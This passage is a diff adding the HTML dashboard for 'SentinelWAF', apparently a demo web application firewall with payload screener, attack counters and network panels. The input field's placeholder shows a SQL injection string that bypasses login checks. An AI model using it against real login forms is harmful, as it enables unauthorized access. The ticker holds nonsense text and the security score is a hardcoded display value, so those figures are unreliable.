@@ -1,0 +1,1966 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SentinelWAF</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
+  *{font-family:'Inter',sans-serif}
+  .mono{font-family:'JetBrains Mono',monospace}
+  ::-webkit-scrollbar{width:4px}
+  ::-webkit-scrollbar-thumb{background:#4ade8044;border-radius:4px}
+  .grid-bg{
+    background-image:linear-gradient(rgba(74,222,128,0.03) 1px,transparent 1px),
+                     linear-gradient(90deg,rgba(74,222,128,0.03) 1px,transparent 1px);
+    background-size:50px 50px;
+  }
+  .green-glow{box-shadow:0 0 20px rgba(74,222,128,0.35)}
+  .text-glow{text-shadow:0 0 20px rgba(74,222,128,0.5)}
+  .light-beam{
+    position:absolute;top:-60px;left:50%;transform:translateX(-50%);
+    width:3px;height:320px;
+    background:linear-gradient(180deg,#4ade80cc,#4ade8066 40%,transparent);
+    filter:blur(0.5px);animation:beamPulse 2s ease-in-out infinite;
+  }
+  .light-beam-glow{
+    position:absolute;top:-60px;left:50%;transform:translateX(-50%);
+    width:80px;height:280px;
+    background:linear-gradient(180deg,rgba(74,222,128,0.25),transparent);
+    filter:blur(20px);animation:beamPulse 2s ease-in-out infinite;
+  }
+  .radar-sweep{
+    position:absolute;width:50%;height:2px;
+    right:50%;top:50%;transform-origin:right center;
+    background:linear-gradient(90deg,transparent,#4ade80);
+    animation:sweep 3s linear infinite;
+  }
+  @keyframes sweep       { to{transform:rotate(360deg)} }
+  @keyframes beamPulse   { 0%,100%{opacity:0.6} 50%{opacity:1} }
+  @keyframes float       { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-12px)} }
+  @keyframes ticker      { from{transform:translateX(100vw)} to{transform:translateX(-100%)} }
+  @keyframes dotPulse    { 0%,100%{transform:scale(1)} 50%{transform:scale(1.4)} }
+  @keyframes newRow      { 0%{background:rgba(74,222,128,0.2)} 100%{background:transparent} }
+  @keyframes newFade     { 0%{opacity:1} 70%{opacity:1} 100%{opacity:0} }
+  @keyframes simPulse    { 0%,100%{box-shadow:0 0 0 0 rgba(74,222,128,0.4)} 50%{box-shadow:0 0 0 8px rgba(74,222,128,0)} }
+
+  .float-anim   { animation:float 3s ease-in-out infinite }
+  .dot-pulse    { animation:dotPulse 1.5s ease-in-out infinite }
+  .ticker-anim  { display:inline-block; animation:ticker 25s linear infinite; white-space:nowrap }
+  .new-row-anim { animation:newRow 2.5s ease forwards }
+  .new-tag      { animation:newFade 3s ease forwards; font-size:9px }
+  .modal-bg     { backdrop-filter:blur(10px); background:rgba(0,0,0,0.85) }
+  .flash-card   { transition:border-color 0.3s,box-shadow 0.3s }
+  .flash-card.active { border-color:rgba(74,222,128,0.7)!important; box-shadow:0 0 20px rgba(74,222,128,0.25)!important }
+  .sim-running  { animation:simPulse 1s ease-in-out infinite }
+</style>
+</head>
+<body class="bg-[#080c08] text-white grid-bg min-h-screen overflow-x-hidden">
+
+<!-- BG Glows -->
+<div class="fixed top-0 right-0 w-[600px] h-[600px] rounded-full pointer-events-none z-0"
+     style="background:radial-gradient(circle,rgba(74,222,128,0.15),transparent 70%)"></div>
+<div class="fixed bottom-0 left-0 w-[400px] h-[400px] rounded-full pointer-events-none z-0"
+     style="background:radial-gradient(circle,rgba(74,222,128,0.08),transparent 70%)"></div>
+<div class="fixed top-0 right-24 w-1 h-[55vh] pointer-events-none z-0 opacity-70"
+     style="background:linear-gradient(180deg,#4ade80aa,transparent);transform:rotate(15deg);transform-origin:top;filter:blur(1px)"></div>
+<div class="fixed top-0 right-32 w-20 h-[50vh] pointer-events-none z-0"
+     style="background:linear-gradient(180deg,rgba(74,222,128,0.12),transparent);transform:rotate(10deg);transform-origin:top;filter:blur(18px)"></div>
+
+<!-- TICKER -->
+<div class="bg-[#050805] border-b border-green-900 overflow-hidden py-1 relative z-10 mono text-green-400 text-xs">
+  <span class="ticker-anim">
+    &nbsp;&nbsp;🟢 WAF ACTIVE &nbsp;|&nbsp; Kali neecURsEv > $0.KA8 +b0234 &nbsp;|&nbsp;
+    192.168.28.7 ATN0080 +906.0% &nbsp;|&nbsp; THREATS BLOCKED &nbsp;|&nbsp;
+    PAYLOAD INPUTS -8% &nbsp;|&nbsp; SYSTEM INTEGRITY: 92% &nbsp;|&nbsp;
+    SQL INJECTION RISK: 42% &nbsp;|&nbsp; Anonet.etic madin liaer &nbsp;&nbsp;
+  </span>
+</div>
+
+<!-- NAVBAR -->
+<nav class="sticky top-0 z-50 flex items-center justify-between px-14 py-4
+            bg-[#080c08]/90 backdrop-blur border-b border-green-900/30">
+  
+  <!-- WRAP LOGO + TAGLINE TOGETHER -->
+  <div class="flex flex-col">
+    <!-- Row 1: Logo & Name -->
+    <div class="flex items-center gap-3 font-black text-xl">
+      <div class="w-10 h-10 bg-green-400 rounded-xl flex items-center justify-center text-xl green-glow">🛡</div>
+      <span>Sentinel <span class="text-green-400">WAF</span></span>
+    </div>
+    
+    <!-- Row 2: Tagline (Original text-sm size preserved) -->
+    <p class="text-sm text-gray-400 font-medium ml-1">
+      Dual-Stage Reverse Proxy WAF &amp; Threat Telemetry Engine
+    </p>
+  </div>
+
+  <!-- MENU LINKS -->
+  <div class="flex gap-8 bg-[#0f1f0f]/80 border border-green-900/30 rounded-full px-8 py-2">
+    <a href="#" class="text-white text-xs font-semibold tracking-widest uppercase">Core Engine</a>
+    <a href="#" onclick="openNetworkMatrix();return false;" class="text-gray-500 text-xs tracking-widest uppercase hover:text-white transition">Network Matrix</a>
+    <a href="#" onclick="openSignatureLogs();return false;" class="text-gray-500 text-xs tracking-widest uppercase hover:text-white transition">Signature Logs</a>
+  </div>
+
+  <!-- DASHBOARD BUTTON -->
+  <button onclick="openDash()"
+    class="relative bg-green-400 text-[#080c08] font-bold text-sm px-6 py-2.5 rounded-full
+           hover:bg-green-300 transition green-glow flex items-center gap-2">
+    Threat Dashboard →
+    <span id="navBadge"
+      class="absolute -top-1.5 -right-1.5 hidden bg-red-500 text-white
+             text-[9px] font-black w-5 h-5 rounded-full items-center
+             justify-center border-2 border-[#080c08]">0</span>
+  </button>
+
+</nav>
+
+<!-- HERO -->
+<section class="flex gap-6 px-14 py-10 relative z-10 min-h-[90vh] items-start">
+
+  <!-- LEFT -->
+  <div class="flex-[1.2] pt-4 space-y-5">
+    <h1 class="text-6xl font-black leading-tight">
+      Secure Your<br>
+      <span class="text-green-400 text-glow">Digital Network</span><br>World.
+    </h1>
+
+    <!-- INPUT CARD -->
+    <div class="bg-[#0c140c]/80 border border-green-400/15 rounded-xl p-5 max-w-md backdrop-blur space-y-3">
+      <p class="text-green-400 text-[10px] tracking-[2px] uppercase font-bold">
+        ⚡ Request Vector Screener
+      </p>
+
+      <!-- Manual Input -->
+      <div class="flex">
+        <input id="payloadInput" type="text"
+          placeholder="e.g., admin' OR '1'='1"
+          class="flex-1 bg-[#080c08]/90 border border-green-400/20 border-r-0
+                 text-gray-300 px-4 py-3 rounded-l-lg text-xs mono outline-none
+                 focus:border-green-400/50 placeholder:text-gray-700
+                 placeholder:italic transition">
+        <div class="bg-green-400/10 border border-green-400/20 text-green-400
+                    text-[10px] font-bold px-3 flex items-center rounded-r-lg
+                    tracking-widest">STRING</div>
+      </div>
+
+      <!-- Manual Intercept Button -->
+      <button id="interceptBtn" onclick="intercept()"
+        class="w-full bg-green-400 text-[#080c08] font-black text-xs
+               tracking-widest uppercase py-3 rounded-lg hover:bg-green-300
+               transition shadow-[0_4px_20px_rgba(74,222,128,0.3)]">
+        ⚡ INTERCEPT PAYLOAD VECTORS
+      </button>
+
+      <!-- Divider -->
+      <div class="flex items-center gap-3">
+        <div class="flex-1 h-px bg-green-400/10"></div>
+        <span class="text-gray-700 text-[10px]">OR</span>
+        <div class="flex-1 h-px bg-green-400/10"></div>
+      </div>
+
+      <!-- SIMULATION BUTTON -->
+      <button id="simBtn" onclick="toggleSimulation()"
+        class="w-full border-2 border-green-400/40 text-green-400 font-black
+               text-xs tracking-widest uppercase py-3 rounded-lg
+               hover:bg-green-400/10 transition flex items-center
+               justify-center gap-2">
+        <span id="simBtnIcon">⚡</span>
+        <span id="simBtnText">START ATTACK STRESS TEST</span>
+      </button>
+
+      <!-- Simulation Progress Bar (indeterminate live-stream indicator) -->
+      <div id="simProgressWrap" style="display:none"
+           class="h-1.5 bg-[#1a2e1a] rounded-full overflow-hidden">
+        <div id="simProgressFill"
+             class="h-full w-full bg-gradient-to-r from-green-600 to-green-400
+                    rounded-full transition-all duration-300"
+             style="width:0%"></div>
+      </div>
+
+      <!-- Simulation Status -->
+      <div id="simStatus"
+           class="text-[10px] text-green-400/70 mono text-center hidden">
+      </div>
+    </div>
+
+  </div>
+
+  <!-- CENTER SHIELD -->
+  <div class="flex-1 flex flex-col items-center justify-center relative min-h-[500px]">
+    <div class="light-beam-glow"></div>
+    <div class="light-beam"></div>
+    <div class="mt-28 flex flex-col items-center">
+
+      <!-- Gray Metallic SVG Shield -->
+      <div class="float-anim"
+           style="filter:drop-shadow(0 0 25px rgba(74,222,128,0.5))">
+        <svg width="150" height="170" viewBox="0 0 100 115"
+             xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="shieldGray" x1="0%" y1="0%" x2="100%" y2="100%">
+              <stop offset="0%"   stop-color="#9ca3af"/>
+              <stop offset="40%"  stop-color="#6b7280"/>
+              <stop offset="100%" stop-color="#374151"/>
+            </linearGradient>
+            <linearGradient id="shieldInner" x1="0%" y1="0%" x2="100%" y2="100%">
+              <stop offset="0%"   stop-color="#d1d5db"/>
+              <stop offset="100%" stop-color="#4b5563"/>
+            </linearGradient>
+            <linearGradient id="shieldBorder" x1="0%" y1="0%" x2="100%" y2="100%">
+              <stop offset="0%"   stop-color="#4ade80"/>
+              <stop offset="50%"  stop-color="#9ca3af"/>
+              <stop offset="100%" stop-color="#4ade80"/>
+            </linearGradient>
+          </defs>
+          <path d="M50 4 L92 20 L92 55 C92 79 74 100 50 110 C26 100 8 79 8 55 L8 20 Z"
+                fill="url(#shieldGray)" stroke="url(#shieldBorder)" stroke-width="1.5"/>
+          <path d="M50 13 L84 27 L84 55 C84 75 68 93 50 102 C32 93 16 75 16 55 L16 27 Z"
+                fill="url(#shieldInner)" opacity="0.25"/>
+          <path d="M22 28 C28 20 38 15 50 13 L50 65 C38 62 26 52 22 28Z"
+                fill="white" opacity="0.07"/>
+          <rect x="36" y="60" width="28" height="22" rx="4"
+                fill="#4ade80" opacity="0.95"/>
+          <path d="M42 60 L42 52 C42 44 58 44 58 52 L58 60"
+                stroke="#4ade80" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+          <circle cx="50" cy="69" r="3.5" fill="#080c08"/>
+          <rect x="48.5" y="69" width="3" height="6" rx="1" fill="#080c08"/>
+          <circle cx="35" cy="95" r="2" fill="#6b7280" opacity="0.6"/>
+          <circle cx="50" cy="100" r="2" fill="#6b7280" opacity="0.6"/>
+          <circle cx="65" cy="95" r="2" fill="#6b7280" opacity="0.6"/>
+        </svg>
+      </div>
+
+      <div class="w-44 h-4 rounded-full mt-[-16px] blur-md"
+           style="background:radial-gradient(ellipse,rgba(74,222,128,0.4),transparent 70%)">
+      </div>
+      <div class="bg-gradient-to-r from-[#0f1f0f] to-[#1a2e1a] border
+                  border-green-400/25 rounded-xl px-10 py-4 mt-2 flex gap-3
+                  items-center" id="netDots"></div>
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div class="w-72 flex flex-col gap-3 pt-2">
+
+    <!-- Live Threat Counter -->
+    <div class="bg-[#0c140c]/85 border border-green-400/20 rounded-2xl p-5 flash-card"
+         id="card-total">
+      <div class="flex items-center justify-between mb-1">
+        <span class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">
+          Total Threats Blocked
+        </span>
+        <span class="w-2 h-2 bg-green-400 rounded-full dot-pulse shadow-[0_0_6px_#4ade80]"></span>
+      </div>
+      <div class="text-5xl font-black text-white" id="threatCount">0</div>
+      <div class="h-1 bg-[#1a2e1a] rounded-full mt-3 overflow-hidden">
+        <div id="threatBar"
+             class="h-full bg-gradient-to-r from-green-600 to-green-400
+                    rounded-full transition-all duration-700"
+             style="width:0%"></div>
+      </div>
+      <div class="text-[10px] text-gray-600 mt-1.5">
+        Session total — updates on each intercept
+      </div>
+    </div>
+
+    <!-- Attack Breakdown -->
+    <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4 flash-card"
+         id="card-types">
+      <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">
+        Attack Breakdown
+      </div>
+      <div class="space-y-2">
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-red-500 inline-block"></span>SQL Injection
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-sql" class="h-full bg-red-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-red-400 w-5 text-right" id="cnt-sql">0</span>
+          </div>
+        </div>
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-orange-500 inline-block"></span>XSS
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-xss" class="h-full bg-orange-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-orange-400 w-5 text-right" id="cnt-xss">0</span>
+          </div>
+        </div>
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-purple-500 inline-block"></span>Path Traversal
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-path" class="h-full bg-purple-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-purple-400 w-5 text-right" id="cnt-path">0</span>
+          </div>
+        </div>
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-cyan-500 inline-block"></span>CMD Injection
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-cmd" class="h-full bg-cyan-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-cyan-400 w-5 text-right" id="cnt-cmd">0</span>
+          </div>
+        </div>
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-pink-500 inline-block"></span>Bot Scraper
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-bot" class="h-full bg-pink-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-pink-400 w-5 text-right" id="cnt-bot">0</span>
+          </div>
+        </div>
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-blue-500 inline-block"></span>Rate Limit Abuse
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-rate" class="h-full bg-blue-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-blue-400 w-5 text-right" id="cnt-rate">0</span>
+          </div>
+        </div>
+        <div class="flex items-center justify-between">
+          <span class="text-xs text-gray-400 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-sm bg-yellow-500 inline-block"></span>Other
+          </span>
+          <div class="flex items-center gap-2">
+            <div class="w-20 h-1.5 bg-[#1a2e1a] rounded overflow-hidden">
+              <div id="bar-other" class="h-full bg-yellow-500 rounded transition-all duration-700" style="width:0%"></div>
+            </div>
+            <span class="text-xs font-bold text-yellow-400 w-5 text-right" id="cnt-other">0</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Last Intercepted -->
+    <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4 flash-card"
+         id="card-last">
+      <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-2">
+        Last Intercepted
+      </div>
+      <div id="lastPayload"
+           class="mono text-[11px] text-green-300 bg-[#080c08]/80
+                  border border-green-400/15 rounded-lg px-3 py-2 truncate">—</div>
+      <div class="flex items-center justify-between mt-2">
+        <span class="text-[10px] text-gray-600" id="lastTime">—</span>
+        <span id="lastType"
+              class="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-800 text-gray-500">—</span>
+      </div>
+    </div>
+
+    <!-- Radar + WAF Status -->
+    <div class="grid grid-cols-2 gap-3">
+      <div class="bg-[#050c05]/90 border border-green-400/15 rounded-xl
+                  flex items-center justify-center h-28">
+        <div class="w-20 h-20 rounded-full border border-green-400/30
+                    relative flex items-center justify-center">
+          <div class="absolute rounded-full border border-green-400/20"
+               style="width:52px;height:52px"></div>
+          <div class="absolute w-6 h-6 rounded-full border border-green-400/20"></div>
+          <div class="radar-sweep"></div>
+          <div class="absolute w-1.5 h-1.5 bg-green-400 rounded-full
+                      shadow-[0_0_6px_#4ade80]" style="top:20%;left:60%"></div>
+          <div class="absolute w-1 h-1 bg-green-400 rounded-full"
+               style="top:65%;left:28%"></div>
+        </div>
+      </div>
+      <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-xl p-3
+                  flex flex-col justify-between">
+        <div class="text-[9px] text-gray-600 uppercase tracking-widest">WAF Status</div>
+        <div>
+          <div class="inline-flex items-center gap-1.5 bg-green-400/15
+                      border border-green-400 text-green-400 text-[10px]
+                      font-black px-2 py-1 rounded-md mt-1">
+            <span class="w-1.5 h-1.5 bg-green-400 rounded-full dot-pulse"></span>ACTIVE
+          </div>
+          <div class="text-[9px] text-gray-600 mt-2">Monitoring HTTP</div>
+        </div>
+        <div class="text-[9px] text-gray-700 mt-1">Port: 5000</div>
+      </div>
+    </div>
+
+    <!-- Security Score -->
+    <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-4">
+      <div class="flex justify-between items-center mb-2">
+        <span class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">
+          Security Score
+        </span>
+        <span class="text-green-400 text-[10px] font-bold">✦ SECURE</span>
+      </div>
+      <div class="flex items-end gap-2">
+        <span class="text-4xl font-black text-green-400 text-glow" id="secScore">92%</span>
+        <span class="text-gray-600 text-xs mb-1.5">overall</span>
+      </div>
+      <div class="h-1.5 bg-[#1a2e1a] rounded-full mt-2 overflow-hidden">
+        <div id="secBar" class="h-full rounded-full transition-all duration-1000"
+             style="width:92%;background:linear-gradient(90deg,#166534,#4ade80)"></div>
+      </div>
+      <div class="flex justify-between text-[9px] text-gray-700 mt-1">
+        <span>0</span><span>100</span>
+      </div>
+    </div>
+
+  </div><!-- end right panel -->
+</section>
+
+<!-- ================================================
+     DASHBOARD MODAL
+================================================ -->
+<div id="dashOverlay"
+     class="fixed inset-0 z-[999] modal-bg hidden items-center justify-center p-5"
+     onclick="overlayClick(event)">
+  <div class="bg-[#0a120a] border border-green-400/20 rounded-2xl w-full max-w-6xl
+              max-h-[90vh] overflow-y-auto shadow-[0_0_80px_rgba(74,222,128,0.08)]
+              animate__animated animate__fadeInUp animate__faster">
+
+    <!-- Topbar -->
+    <div class="sticky top-0 z-10 flex items-center justify-between px-6 py-4
+                bg-[#0a120a]/98 backdrop-blur border-b border-green-400/10 rounded-t-2xl">
+      <div class="flex items-center gap-2.5 font-black text-lg">
+        <div class="w-8 h-8 bg-green-400 rounded-lg flex items-center
+                    justify-center shadow-[0_0_12px_rgba(74,222,128,0.4)]">🛡</div>
+        Sentinel <span class="text-green-400 ml-1">WAF</span>
+      </div>
+      <div class="flex items-center gap-3">
+        <div class="bg-green-400/15 border border-green-400/35 text-green-400
+                    px-4 py-1.5 rounded-full text-sm font-semibold">📊 Dashboard</div>
+        <div class="flex items-center gap-2 border border-green-400/20
+                    px-3 py-1.5 rounded-full">
+          <div class="w-2 h-2 bg-green-400 rounded-full dot-pulse"></div>
+          <span class="text-green-400 text-xs font-semibold">LIVE</span>
+          <span class="text-gray-600 text-xs" id="liveCountTxt">— intercepted</span>
+        </div>
+      </div>
+      <button onclick="closeDash()"
+        class="w-9 h-9 rounded-full bg-red-500/12 border border-red-500/30
+               text-red-400 flex items-center justify-center text-lg font-bold
+               hover:bg-red-500/25 transition">✕</button>
+    </div>
+
+    <div class="p-6 space-y-4">
+
+      <!-- Alert Banner -->
+      <div id="alertBanner"
+           class="hidden items-center gap-3 bg-green-400/10 border
+                  border-green-400/40 rounded-xl px-4 py-2.5">
+        <div class="w-2 h-2 bg-green-400 rounded-full dot-pulse flex-shrink-0"></div>
+        <span class="text-green-400 text-xs font-semibold flex-1" id="alertMsg"></span>
+        <button onclick="hideAlert()"
+                class="text-gray-600 hover:text-green-400 text-sm">✕</button>
+      </div>
+
+      <!-- Live Stat Cards -->
+      <div class="grid grid-cols-4 gap-3">
+        <div id="lc-blocked"
+             class="bg-[#0c140c]/85 border border-green-400/12 rounded-xl p-4
+                    flex items-center gap-3 flash-card">
+          <div class="w-10 h-10 bg-green-400/10 rounded-xl flex items-center
+                      justify-center text-xl flex-shrink-0">🛡️</div>
+          <div>
+            <div class="text-xl font-black text-green-400" id="d-blocked">0</div>
+            <div class="text-[10px] text-gray-600">Requests Blocked</div>
+          </div>
+        </div>
+        <div id="lc-sql"
+             class="bg-[#0c140c]/85 border border-green-400/12 rounded-xl p-4
+                    flex items-center gap-3 flash-card">
+          <div class="w-10 h-10 bg-red-500/10 rounded-xl flex items-center
+                      justify-center text-xl flex-shrink-0">⚠️</div>
+          <div>
+            <div class="text-xl font-black text-red-400" id="d-sql">0</div>
+            <div class="text-[10px] text-gray-600">SQL Injection Hits</div>
+          </div>
+        </div>
+        <div id="lc-xss"
+             class="bg-[#0c140c]/85 border border-green-400/12 rounded-xl p-4
+                    flex items-center gap-3 flash-card">
+          <div class="w-10 h-10 bg-orange-500/10 rounded-xl flex items-center
+                      justify-center text-xl flex-shrink-0">💣</div>
+          <div>
+            <div class="text-xl font-black text-orange-400" id="d-xss">0</div>
+            <div class="text-[10px] text-gray-600">XSS Hits</div>
+          </div>
+        </div>
+        <div class="bg-[#0c140c]/85 border border-green-400/12 rounded-xl p-4
+                    flex items-center gap-3">
+          <div class="w-10 h-10 bg-cyan-500/10 rounded-xl flex items-center
+                      justify-center text-xl flex-shrink-0">📡</div>
+          <div>
+            <div class="text-xl font-black text-cyan-400" id="d-score">92%</div>
+            <div class="text-[10px] text-gray-600">Security Score</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- DETAILED TABLE + CSV EXPORT -->
+      <div class="bg-[#0c140c]/85 border border-green-400/12 rounded-2xl p-5">
+        <div class="flex justify-between items-center mb-4 flex-wrap gap-2">
+          <div class="flex items-center gap-3">
+            <span class="font-bold text-gray-200">Attack Surface Overview</span>
+            <span id="rowBadge"
+              class="bg-green-400/10 border border-green-400/25 text-green-400
+                     text-xs font-bold px-3 py-0.5 rounded-full">0 entries</span>
+          </div>
+          <div class="flex gap-2 flex-wrap items-center">
+            <input id="dashSearch" oninput="filterTable()"
+              placeholder="🔍 Search..."
+              class="bg-[#080c08]/90 border border-green-400/20 text-gray-400
+                     text-xs px-4 py-2 rounded-full outline-none w-36
+                     focus:border-green-400/50 transition">
+            <button onclick="filterByBlocked()"
+              class="bg-green-400/10 border border-green-400/25 text-green-400
+                     text-xs px-3 py-2 rounded-lg hover:bg-green-400/18 transition">
+              🚫 Blocked
+            </button>
+            <button onclick="clearFilter()"
+              class="bg-green-400/10 border border-green-400/25 text-green-400
+                     text-xs px-3 py-2 rounded-lg hover:bg-green-400/18 transition">
+              ↺ All
+            </button>
+            <!-- CSV EXPORT BUTTON -->
+            <button onclick="exportCSV()"
+              class="bg-green-400 text-[#080c08] font-black text-xs px-4 py-2
+                     rounded-lg hover:bg-green-300 transition flex items-center
+                     gap-1.5 shadow-[0_0_15px_rgba(74,222,128,0.3)]">
+              📥 Download CSV
+            </button>
+          </div>
+        </div>
+
+        <!-- TABLE: 7 columns -->
+        <div class="overflow-x-auto">
+          <table class="w-full text-left border-collapse">
+            <thead>
+              <tr class="border-b border-green-400/08">
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Log ID</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Date</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Time</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Payload</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Attack Type</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Severity</th>
+                <th class="pb-2 px-2 text-[10px] text-gray-700 uppercase tracking-widest">Action</th>
+              </tr>
+            </thead>
+            <tbody id="dashTable"></tbody>
+          </table>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ================================================
+     NETWORK MATRIX MODAL
+     Infrastructure, packet inspection, IP access
+     control & sensitivity profiles ONLY.
+     No attack logs / threat counts live here.
+================================================ -->
+<div id="networkOverlay"
+     class="fixed inset-0 z-[999] modal-bg hidden items-center justify-center p-5"
+     onclick="overlayClickNM(event)">
+  <div class="bg-[#0a120a] border border-green-400/20 rounded-2xl w-full max-w-6xl
+              max-h-[90vh] overflow-y-auto shadow-[0_0_80px_rgba(74,222,128,0.08)]
+              animate__animated animate__fadeInUp animate__faster">
+
+    <!-- Topbar -->
+    <div class="sticky top-0 z-10 flex items-center justify-between px-6 py-4
+                bg-[#0a120a]/98 backdrop-blur border-b border-green-400/10 rounded-t-2xl">
+      <div class="flex items-center gap-2.5 font-black text-lg">
+        <div class="w-8 h-8 bg-green-400 rounded-lg flex items-center
+                    justify-center shadow-[0_0_12px_rgba(74,222,128,0.4)]">🌐</div>
+        Sentinel <span class="text-green-400 ml-1">WAF</span>
+      </div>
+      <div class="flex items-center gap-3">
+        <div class="bg-green-400/15 border border-green-400/35 text-green-400
+                    px-4 py-1.5 rounded-full text-sm font-semibold">🌐 Network Matrix</div>
+        <div class="flex items-center gap-2 border border-green-400/20
+                    px-3 py-1.5 rounded-full">
+          <div class="w-2 h-2 bg-green-400 rounded-full dot-pulse"></div>
+          <span class="text-green-400 text-xs font-semibold" id="nmModeTxt">ACTIVE BLOCKING</span>
+        </div>
+      </div>
+      <button onclick="closeNetworkMatrix()"
+        class="w-9 h-9 rounded-full bg-red-500/12 border border-red-500/30
+               text-red-400 flex items-center justify-center text-lg font-bold
+               hover:bg-red-500/25 transition">✕</button>
+    </div>
+
+    <div class="p-6 space-y-5">
+
+      <!-- ============ SECTION 1: Server & Telemetry Grid ============ -->
+      <div>
+        <div class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold mb-3">
+          Server &amp; Telemetry Grid
+        </div>
+        <div class="grid grid-cols-3 gap-3">
+
+          <!-- Host Infrastructure -->
+          <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5 backdrop-blur">
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">Host Infrastructure</span>
+              <span class="w-2 h-2 bg-green-400 rounded-full dot-pulse shadow-[0_0_6px_#4ade80]"></span>
+            </div>
+            <div class="space-y-1.5 mono text-xs">
+              <div class="flex justify-between"><span class="text-gray-600">Loopback IP</span><span class="text-green-300">127.0.0.1</span></div>
+              <div class="flex justify-between"><span class="text-gray-600">Active Port</span><span class="text-green-300">5000</span></div>
+              <div class="flex justify-between"><span class="text-gray-600">Protocol</span><span class="text-green-300">HTTP / 1.1</span></div>
+              <div class="flex justify-between items-center"><span class="text-gray-600">Status</span>
+                <span class="inline-flex items-center gap-1.5 text-green-400 font-bold">
+                  <span class="w-1.5 h-1.5 bg-green-400 rounded-full dot-pulse"></span>ONLINE
+                </span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Inspection Engine Performance -->
+          <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5 backdrop-blur">
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">Inspection Engine</span>
+              <span class="text-cyan-400 text-sm">⚙️</span>
+            </div>
+            <div class="space-y-1.5 mono text-xs">
+              <div class="flex justify-between"><span class="text-gray-600">Proxy Type</span><span class="text-green-300">Inline Reverse Proxy</span></div>
+              <div class="flex justify-between"><span class="text-gray-600">Avg Packet Delay</span><span class="text-green-300" id="nmDelay">1.2 ms</span></div>
+              <div class="flex justify-between"><span class="text-gray-600">Engine State</span><span class="text-green-300">Stateful Inspection Active</span></div>
+            </div>
+          </div>
+
+          <!-- Active Enforcement Toggle -->
+          <div class="bg-[#0c140c]/85 border border-green-400/15 rounded-2xl p-5 backdrop-blur flex flex-col justify-between">
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-[10px] text-gray-500 uppercase tracking-widest font-semibold">Active Enforcement</span>
